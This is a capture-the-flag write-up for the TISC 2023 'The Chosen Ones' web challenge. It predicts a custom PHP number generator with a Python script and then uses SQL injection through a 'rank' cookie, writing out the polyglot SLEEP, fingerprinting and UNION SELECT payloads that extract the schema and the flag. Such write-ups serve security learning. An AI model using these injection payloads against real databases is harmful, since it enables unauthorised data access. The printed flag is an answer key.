Overall, I feel this challenge was comparitively straightforward and provided some respite from the previous challenges.

We are asked to guess a number on the landing page, and the number seems to be randomly generated each time:

![number guessing page](/the-chosen-ones-first.png)

Initially, I assumed the php `rand()` function was being used, and spent sometime researching on methods to predict the next random value based on previous outputs. This was largely unsuccessful. However, I eventually realised the source code for generating the 6 digit number was provided in a base32 encoded comment in the html.

```php
function random() {
  $prev = $_SESSION["seed"];
  $current = (int)$prev ^ 844742906;
  $current = decbin($current);
  while (strlen($current) < 32) {
    $current = "0" . $current;
  }
  $first = substr($current, 0, 7);
  $second = substr($current, 7, 25);
  $current = $second . $first;
  $current = bindec($current);
  $_SESSION["seed"] = $current;
  return $current % 1000000;
}
```

After studying this function for a while, I realised it produces a sequence that eventually repeats after being run a certain number of times due to the way the string is being rotated and xored. I wrote some code to check this:

```php
$a = random();
for ($i = 1; ; $i++) {
  if (random() == $a) {
    echo $i . "\n";
    break;
  }
}
```

This printed 64. So the first number will be the same as the 65th number produced. I wrote a python script:

```python:s.py
import requests
import re

sess = requests.Session()

sess.get('http://chals.tisc23.ctf.sg:51943/index.php')

resp = sess.get('http://chals.tisc23.ctf.sg:51943/index.php?entry=aoeu')
a = int(re.search('The lucky number was (\d+?)<BR>', resp.text).group(1))

for _ in range(63):
    sess.get('http://chals.tisc23.ctf.sg:51943/index.php?entry=aoeu')

resp = sess.get('http://chals.tisc23.ctf.sg:51943/index.php?entry=' + str(a))
print(resp.text)

print(sess.cookies.get_dict())

sess.close()
```

```plaintext
<center>
Personnel List <br>
<iframe src="table.php" title="personnel" width="750" height="1500" frameBorder="0">
</center>

{'PHPSESSID': 'srav744br8cui13r6dgb15j2cv', 'rank': '0'}
```

I copied the `PHPSESSID` and `rank` cookies into Chrome, and viewed `/table.php`.

![table](/the-chosen-ones-table.png)

I tried some standard sql injection payloads such as `' or 1=1;--`, however they didn't seem to work. I then tried a polyglot injection payload I found on PayloadAllTheThings:

```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

This yielded no results on both the username and password fields.

Then I remembered the strange `rank` cookie and tried to figure out what it did. I changed the value to 1, and this time the table was larger:

![table](/the-chosen-ones-table-2.png)

Changing the value to 2, I could see more rows with users of rank 2 as well. So rank is probably included in the sql query as well and a possible vector for sql injection. I set rank to the polyglot injection payload above and sent another request. This time, the request returned a server error after a while, so the sql injection was successful.

Next, I had to identify the type of database. Referring to this [list of payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification), I sent `rank=1 and conv('a',16,2)=conv('a',16,2);--` and it succeeded, showing that the underlying database is MySQL.

Next, we have to extract information about the db schema. Following [this section](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#extract-database-with-information_schema), I sent a request with `rank=-1 union select schema_name, 1, 1, 1 from information_schema.schemata;--`

There are 3 schemas, `information_schema`, `palindrome`, and `performance_schema`. palindrome seems to be what we want, so I listed the tables there with `rank=-1 union select table_name, 1, 1, 1 from information_schema.tables where table_schema = "palindrome";--`.

There were 2 tables, `CTF_SECRET` and `PERSONNEL`. I listed the columns in the `CTF_SECRET` table using `rank=-1 union select column_name, 1, 1, 1 from information_schema.columns where table_name = "CTF_SECRET";--`. There was only one column: `flag`.

I sent my final request with `rank=-1 union select flag, 1, 1, 1 from palindrome.CTF_SECRET;--`, and got the flag: `TISC{Y0u_4rE_7h3_CH0s3n_0nE}`.